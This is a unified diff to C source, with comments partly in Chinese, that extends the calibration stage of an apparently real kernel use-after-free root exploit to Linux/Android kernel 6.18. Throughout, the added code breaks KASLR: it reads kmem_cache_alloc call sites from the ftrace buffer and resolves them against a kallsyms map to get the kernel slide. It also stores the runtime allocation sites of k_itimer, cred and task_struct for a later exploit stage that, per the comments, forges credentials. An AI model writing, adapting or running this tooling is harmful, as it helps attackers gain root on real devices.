@@ -11,13 +11,26 @@
  *   addresses are all wrong and the UAF layout is guaranteed to fail. page_offset (linear map base) is used for
  *   object_pfn() to convert k_itimer virtual addresses into PFNs, which also must be measured each boot.
  *
- * calib_a principle:
+ * calib_a principle (6.18 适配后):
  *   timer_probe creates a batch of CLOCK_THREAD_CPUTIME_ID timers,
  *   do_timer_create() allocates k_itimer from posix_timers_cache.
  *   In kmem_cache_alloc tracepoint records, bytes_req == bytes_alloc ==
- *   sizeof(struct k_itimer) == 0x108, and the call site is fixed at
- *   do_timer_create+0xa8 == TIMER_LINK + slide. Take the most frequent call site
- *   and subtract TIMER_LINK to obtain the slide.
+ *   sizeof(struct k_itimer) —— 这个大小是 **随内核版本变的**（6.6=0x108/264，
+ *   6.18=0x180/384），必须从 profile（BTF 推导）里取，不能写死。
+ *
+ *   新解法（首选）：文本 trace 里同一条记录还带 call_site= 与 func=：
+ *       call_site=0xffffffc082211060 func=do_timer_create ptr=... req=384
+ *   call_site 是 _RET_IP_，func 是内核符号化出来的函数名；而该函数的
+ *   **未重定位**地址 F 我们从 kallsyms 里就有。于是
+ *       call_site = F + slide + off,   slide ≡ 0 (mod 2MiB)
+ *   => off = (call_site - F) mod 2MiB 唯一确定（函数长度 < 2MiB）
+ *   => slide = call_site - F - off
+ *   这样完全不需要写死 do_timer_create+0xa8 这种内核内锚点
+ *   （6.18 开 LTO 后该偏移已经漂移，用它算出的 slide 会带固定偏差，
+ *     并传染到 root_user/init_user_ns 等伪造 cred 的内核指针上）。
+ *   顺带把各分配点的运行期 call_site 落到 sites.*，供 exploit 阶段做匹配键。
+ *
+ *   旧解法（兜底）：取出现频次最高的 call site，减去写死的 TIMER_LINK。
  *
  * calib_b principle:
  *   Within the same window, sample the mm_page_alloc(order=1) PFN set simultaneously (from text trace)
@@ -44,6 +57,7 @@
 
 #include "kernel_table.h"
 #include "calib.h"
+#include "slide_resolve.h"
 
 #define TRACE "/sys/kernel/tracing"
 #define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
@@ -364,6 +378,200 @@ static int cmp_u64_local(const void *a, const void *b)
 	return (x > y) - (x < y);
 }
 
+
+/* ------------------------------------------------------------------ *
+ * 6.18 适配：kallsyms 精确解 slide
+ * ------------------------------------------------------------------ */
+
+/* kallsyms 文本（未重定位 VA）。由 APK 侧导入 boot.img 时导出，
+ * 形如 "0xffffffc08021104c do_timer_create"，按 VA 升序。
+ * 文件放在 $CVE98260_HOME/kallsyms.txt。 */
+static char *g_kallsyms_buf;
+
+static int load_kallsyms_map(sr_sym **out_syms, size_t *out_n)
+{
+	char path[512];
+	FILE *f;
+	long len;
+	sr_sym *arr = NULL;
+	size_t n = 0, cap = 0;
+	char *p;
+
+	*out_syms = NULL;
+	*out_n = 0;
+
+	snprintf(path, sizeof(path), "%s/kallsyms.txt", calib_home());
+	f = fopen(path, "rb");
+	if (!f) {
+		fprintf(stderr, "[calib_a] kallsyms map not found: %s\n", path);
+		return -1;
+	}
+	fseek(f, 0, SEEK_END);
+	len = ftell(f);
+	fseek(f, 0, SEEK_SET);
+	if (len <= 0 || len > (64L << 20)) {
+		fclose(f);
+		return -1;
+	}
+	g_kallsyms_buf = (char *)malloc((size_t)len + 1);
+	if (!g_kallsyms_buf) {
+		fclose(f);
+		return -1;
+	}
+	if (fread(g_kallsyms_buf, 1, (size_t)len, f) != (size_t)len) {
+		free(g_kallsyms_buf);
+		g_kallsyms_buf = NULL;
+		fclose(f);
+		return -1;
+	}
+	g_kallsyms_buf[len] = 0;
+	fclose(f);
+
+	p = g_kallsyms_buf;
+	while (*p) {
+		char *nl = strchr(p, '\n');
+		unsigned long long va;
+		char name[256];
+		char *nstart;
+
+		if (nl)
+			*nl = 0;
+		if (sscanf(p, "%llx %255s", &va, name) == 2) {
+			nstart = p + strspn(p, " \t");
+			/* 同一 VA 常有多个别名（_text/__pi__text…）：只保留第一个，
+			 * 否则「下一个符号」会算出 0 长度的函数。 */
+			if (n && arr[n - 1].va == (uint64_t)va) {
+				if (!nl)
+					break;
+				p = nl + 1;
+				continue;
+			}
+			if (n == cap) {
+				size_t ncap = cap ? cap * 2 : 8192;
+				sr_sym *na = (sr_sym *)realloc(arr, ncap * sizeof(sr_sym));
+				if (!na)
+					break;
+				arr = na;
+				cap = ncap;
+			}
+			arr[n].va = (uint64_t)va;
+			arr[n].name = nstart;   /* 指向 g_kallsyms_buf，不拷贝 */
+			n++;
+		}
+		if (!nl)
+			break;
+		p = nl + 1;
+	}
+	if (!n) {
+		free(arr);
+		return -1;
+	}
+	*out_syms = arr;
+	*out_n = n;
+	return 0;
+}
+
+/* 从文本 trace 里找一条 kmem_cache_alloc 记录，按 req（分配大小）过滤。
+ * 返回 0 命中；func_out 拿到 func=xxx，site_out 拿到 call_site=0x...。 */
+static int trace_kmem_call_site(uint64_t want_req, char *func_out, size_t func_cap,
+				uint64_t *site_out)
+{
+	FILE *f = fopen(TRACE "/trace", "r");
+	char line[2048];
+	int found = 0;
+
+	if (!f)
+		return -1;
+	while (fgets(line, sizeof(line), f)) {
+		char *p;
+		unsigned long long site, req;
+		char func[256];
+
+		if (!strstr(line, "kmem_cache_alloc:"))
+			continue;
+		p = strstr(line, "call_site=0x");
+		if (!p || sscanf(p, "call_site=0x%llx", &site) != 1)
+			continue;
+		p = strstr(line, "req=");
+		if (!p || sscanf(p, "req=%llu", &req) != 1)
+			continue;
+		if (req != want_req)
+			continue;
+		p = strstr(line, "func=");
+		if (!p || sscanf(p, "func=%255s", func) != 1)
+			continue;
+		snprintf(func_out, func_cap, "%s", func);
+		*site_out = (uint64_t)site;
+		found = 1;
+		break;
+	}
+	fclose(f);
+	return found ? 0 : -1;
+}
+
+/* 用 kallsyms 精确解 slide，并把各分配点的运行期 call_site 落盘，
+ * 供 exploit 阶段当 trace 匹配键（替代写死的 timer_link / cred_link）。 */
+static int calib_a_resolve_via_kallsyms(const struct kernel_offsets *o,
+					uint64_t *out_slide)
+{
+	sr_sym *syms = NULL;
+	size_t n = 0;
+	char func[256];
+	uint64_t site = 0, slide = 0, unreloc = 0;
+	int rc;
+
+	if (!o || !o->kitimer_size)
+		return -1;
+	if (load_kallsyms_map(&syms, &n) != 0)
+		return -1;
+
+	if (trace_kmem_call_site(o->kitimer_size, func, sizeof(func), &site) != 0) {
+		fprintf(stderr, "[calib_a] text trace has no kmem_cache_alloc with req=%#llx\n",
+			(unsigned long long)o->kitimer_size);
+		goto fail;
+	}
+	fprintf(stdout, "[calib_a] trace: call_site=%#llx func=%s req=%#llx\n",
+		(unsigned long long)site, func, (unsigned long long)o->kitimer_size);
+
+	rc = sr_resolve_slide_named(syms, n, func, site, &slide, &unreloc);
+	if (rc != 1) {
+		fprintf(stderr, "[calib_a] kallsyms slide resolution failed (rc=%d)\n", rc);
+		goto fail;
+	}
+	fprintf(stdout, "[calib_a] resolved slide=%#llx (unrelocated call site %#llx)\n",
+		(unsigned long long)slide, (unsigned long long)unreloc);
+
+	/* 运行期调用点落盘：exploit 阶段用它们做 trace 匹配键 */
+	{
+		char buf[128];
+		char f2[256], f3[256];
+		uint64_t s2 = 0, s3 = 0;
+
+		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)site);
+		if (write_result_file("sites.kitimer", buf))
+			fprintf(stderr, "[calib_a] warn: cannot write sites.kitimer\n");
+		if (o->cred_size &&
+		    trace_kmem_call_site(o->cred_size, f2, sizeof(f2), &s2) == 0) {
+			snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)s2);
+			if (write_result_file("sites.cred", buf))
+				fprintf(stderr, "[calib_a] warn: cannot write sites.cred\n");
+		}
+		if (o->task_struct_size &&
+		    trace_kmem_call_site(o->task_struct_size, f3, sizeof(f3), &s3) == 0) {
+			snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)s3);
+			if (write_result_file("sites.task", buf))
+				fprintf(stderr, "[calib_a] warn: cannot write sites.task\n");
+		}
+	}
+
+	*out_slide = slide;
+	free(syms);
+	return 0;
+fail:
+	free(syms);
+	return -1;
+}
+
 /* ------------------------------------------------------------------ calib_a */
 
 int calib_a_main(int argc, char **argv)
@@ -434,6 +642,27 @@ int calib_a_main(int argc, char **argv)
 	}
 	capture_raw(&sink, paths, 1, 5);
 	fprintf(stdout, "[calib_a] captured raw=%zu bytes\n", sink.len);
+
+	/* 6.18 适配：优先用 kallsyms 精确解 slide（不依赖写死锚点）；
+	 * 失败再退回旧的「最频 call_site - TIMER_LINK」法。 */
+	{
+		uint64_t slide_new = 0;
+
+		if (calib_a_resolve_via_kallsyms(o, &slide_new) == 0) {
+			char nbuf[64];
+
+			snprintf(nbuf, sizeof(nbuf), "0x%llx", (unsigned long long)slide_new);
+			if (!write_result_file("slide.txt", nbuf)) {
+				fprintf(stdout, "[calib_a] slide = %#llx  _text = %#llx\n",
+					(unsigned long long)slide_new,
+					(unsigned long long)(UINT64_C(0xFFFFFFC080000000) + slide_new));
+				fprintf(stdout, "C98260_SLIDE=0x%llx\n", (unsigned long long)slide_new);
+				fprintf(stdout, "[calib_a] done\n");
+				rc = 0;
+				goto out;
+			}
+		}
+	}
 
 	sites = calib_scan_kitimer(sink.buf, sink.len, 0, 1, 0, sizes, n_sizes, &n_sites);
 	if (!sites || !n_sites) {
